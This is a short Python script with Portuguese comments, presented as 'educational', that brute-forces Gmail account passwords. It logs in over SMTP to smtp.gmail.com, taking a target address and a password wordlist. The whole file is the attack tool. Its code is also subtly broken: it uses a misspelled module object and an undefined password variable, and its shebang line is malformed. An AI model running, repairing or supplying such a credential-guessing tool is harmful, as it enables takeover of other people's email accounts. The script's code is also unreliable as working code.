#!/usr/bin/ env python3
"""
obs:"Script by vinissh para fins educacionais"
Data:23/02/2018
 
                     *Brute Force em Gmail*
"""
 
 
import smtplib
import email.utils
 
#Criando conexão
 
smtpcliente  = smtplib.SMTP('smtp.gmail.com',587)
smtpcliente.ehlo()
smtpcliente.starttls()
 
 
#Criando varáveis de entrada
 
 
usuario = str(input('\nEntre com o alvo:\n '))
arquivo = input('\nEntre com o arquivo de senhas: \n ')
arquivo = open(arquivo, 'r')
 
 
#Realizando o ataque
 
for password in arquivo:
    try:
 
        smtpllib.login(usuario, senha)
        print('[*]Encontramos a senha %s:'%(senha))
        break;
 
    except smtplib.SMTPAuthenticationError:
        print('[*] Senha incorreta %s:'%(senha))
 
exit()
